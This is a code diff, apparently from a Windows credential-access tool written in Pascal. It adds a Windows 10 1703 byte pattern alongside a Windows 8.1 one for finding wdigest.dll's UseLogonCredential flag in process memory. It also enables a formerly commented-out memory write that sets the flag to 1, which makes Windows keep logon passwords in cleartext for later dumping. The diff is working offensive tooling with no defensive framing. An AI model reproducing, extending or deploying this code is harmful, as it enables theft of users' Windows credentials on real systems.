@@ -870,7 +870,8 @@ const
   //which translates to 39 1D F5  14 03 00
   //F5  14 03 00 is your offset (from current pos) to g_fParameter_UseLogonCredential
   //or we could maintain a table of offsets per windows versions...
-  PTRN_WIN81_UseLogonCredential:array [0..14] of byte=  ($F7, $46 ,$50 ,$00 ,$08 ,$00 ,$00 ,$0F ,$85 ,$0C ,$52 ,$00 ,$00 ,$39 ,$1D);
+  PTRN_WIN81_UseLogonCredential:array [0..14] of byte=       ($F7,$46,$50,$00,$08,$00,$00,$0F,$85,$0C,$52,$00,$00,$39,$1D);
+  PTRN_WIN10_1703_UseLogonCredential:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$11,$3B,$00,$00,$39,$1D);
 var
   module:string='wdigest.dll';
   hprocess:thandle;
@@ -888,16 +889,18 @@ result:=false;
   if (lowercase(osarch)='amd64') then
      begin
      if copy(winver,1,3)='6.3' then
-        if 1=1 then
         begin
         setlength(pattern,sizeof(PTRN_WIN81_UseLogonCredential));
         copymemory(@pattern[0],@PTRN_WIN81_UseLogonCredential[0],sizeof(PTRN_WIN81_UseLogonCredential));
         patch_pos:=4;
-        end
-        else
-        begin
         end;
-     end;
+     if pos('-1703',winver)>0 then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN10_1703_UseLogonCredential));
+        copymemory(@pattern[0],@PTRN_WIN10_1703_UseLogonCredential[0],sizeof(PTRN_WIN10_1703_UseLogonCredential));
+        patch_pos:=4;
+        end;
+     end; //if (lowercase(osarch)='amd64') then
 
   if patch_pos =0 then
      begin
@@ -926,10 +929,14 @@ result:=false;
       begin
       //CopyMemory(@offset_dword,@offset_byte[0],4);
       log('ReadProcessMemory OK '+inttohex(offset_dword,4));
-      log('g_UseLogonCredential:'+inttohex(offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos,sizeof(pointer)));
+      offset:=offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos;
+      log('g_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
       //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
       //dw:=1;
-      //WriteProcessMemory (hprocess,pointer(offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_list_dword+patch_pos),@dw,4);
+      ReadMem (hprocess,offset,@dw,4);
+      log('g_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
+      dw:=ByteSwap32 (1);
+      writemem(hprocess,offset,@dw,4);
       result:=true;
       end; //if readmem
     closehandle(hprocess);
